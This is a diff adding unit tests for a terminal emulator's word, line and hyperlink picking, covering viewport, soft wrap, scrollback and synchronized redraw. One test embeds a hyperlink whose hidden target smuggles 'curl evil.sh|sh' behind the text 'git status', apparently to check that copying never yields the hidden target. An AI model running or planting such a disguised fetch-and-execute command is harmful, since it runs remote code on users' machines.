@@ -237,3 +237,107 @@ test("a command exits only once its status arrives, not when its PTY hangs up", 
     closeReadiness();
   }
 });
+test("a pick finds the word or line at a cell and keeps the viewport", () => {
+  const t = Terminal.create(40, 4);
+  try {
+    t.feed("see src/a.ts:42:7. ok\r\nsecond line here");
+    const before = t.surface(0);
+    const word = (x: number, y: number, to_x: number | null = null) =>
+      t.pick("word", x, y, to_x, to_x === null ? null : y, 0);
+    // A word keeps its colons and drops a trailing period.
+    expect(word(6, 0)).toEqual({
+      match: { x: 4, y: 0, end_x: 16, end_y: 0 },
+      shown: "src/a.ts:42:7",
+      copy: "src/a.ts:42:7",
+    });
+    expect(word(3, 0)).toEqual({ match: null, shown: "", copy: "" });
+    // A drag extends by words.
+    expect(word(6, 0, 20).copy).toBe("src/a.ts:42:7. ok");
+    expect(t.pick("line", 2, 1, null, null, 0).copy).toBe("second line here");
+    expect(t.surface(0)).toEqual(before);
+  } finally {
+    t.destroy();
+  }
+});
+test("a pick in history leaves the daemon's viewport and selection alone", () => {
+  const t = Terminal.create(20, 3);
+  try {
+    t.feed("line0\r\nline1\r\nline2\r\nline3\r\nline4 end");
+    t.select(0, 0, 4, 0);
+    expect(t.selectedText()).toBe("line2");
+    // The view at the top of the history, borrowed and given back.
+    expect(t.pick("word", 1, 0, null, null, 0).copy).toBe("line0");
+    expect(t.selectedText()).toBe("line2");
+    t.select(0, 0, 4, 0);
+    expect(t.selectedText()).toBe("line2");
+  } finally {
+    t.destroy();
+  }
+});
+test("a picked line copies only the rows the view shows", () => {
+  const t = Terminal.create(10, 3);
+  try {
+    // One logical line on four rows, its first above the view.
+    t.feed("x".repeat(10) + "y".repeat(10) + "z".repeat(10) + "www");
+    const bottom = t.surface(0).bottom;
+    expect(bottom).toBe(1);
+    const visible = "y".repeat(10) + "z".repeat(10) + "www";
+    expect(t.pick("line", 1, 0, null, null, bottom)).toEqual({
+      match: { x: 0, y: 0, end_x: 2, end_y: 2 },
+      shown: visible,
+      copy: visible,
+    });
+    // Scrolled up, the line stops at the view's bottom.
+    expect(t.pick("line", 1, 0, null, null, 0).copy).toBe("x".repeat(10) + "y".repeat(10) + "z".repeat(10));
+  } finally {
+    t.destroy();
+  }
+});
+test("a picked word follows a soft wrap", () => {
+  const t = Terminal.create(10, 4);
+  try {
+    t.feed("abcdefghijklmno xyz");
+    expect(t.pick("word", 2, 0, null, null, 0)).toEqual({
+      match: { x: 0, y: 0, end_x: 4, end_y: 1 },
+      shown: "abcdefghijklmno",
+      copy: "abcdefghijklmno",
+    });
+  } finally {
+    t.destroy();
+  }
+});
+test("a picked link copies its target only when the pane shows it", () => {
+  const t = Terminal.create(60, 4);
+  const link = (uri: string, text: string) => `\x1b]8;;${uri}\x1b\\${text}\x1b]8;;\x1b\\`;
+  try {
+    t.feed(
+      `${link("https://example.com/docs", "docs")} ${link("https://x/;curl evil.sh|sh #", "git status")} ${link("https://x.io/a b", "https://x.io/a b")}`,
+    );
+    expect(t.pick("word", 1, 0, null, null, 0).copy).toBe("docs");
+    // The whole link, not just the word under the cell.
+    expect(t.pick("word", 6, 0, null, null, 0)).toEqual({
+      match: { x: 5, y: 0, end_x: 14, end_y: 0 },
+      shown: "git status",
+      copy: "git status",
+    });
+    expect(t.pick("word", 18, 0, null, null, 0).copy).toBe("https://x.io/a b");
+  } finally {
+    t.destroy();
+  }
+});
+test("a pick during a synchronized redraw finds links only in the rows it last drew", () => {
+  const t = Terminal.create(30, 3);
+  try {
+    t.feed("1\r\n\x1b]8;;https://x.io/a b\x1b\\https://x.io/a b\x1b]8;;\x1b\\\r\n2\r\n3");
+    const bottom = t.surface(0).bottom;
+    expect(bottom).toBe(1);
+    t.feed("\x1b[?2026h");
+    expect(t.pick("word", 1, 0, null, null, bottom).copy).toBe("https://x.io/a b");
+    // A view one row up wasn't drawn, so the link picks as a word.
+    expect(t.pick("word", 1, 1, null, null, bottom - 1).copy).toBe("https://x.io/a");
+    // An offset past the history is the bottom.
+    expect(t.pick("word", 1, 0, null, null, 1000).copy).toBe("https://x.io/a b");
+  } finally {
+    t.destroy();
+  }
+});
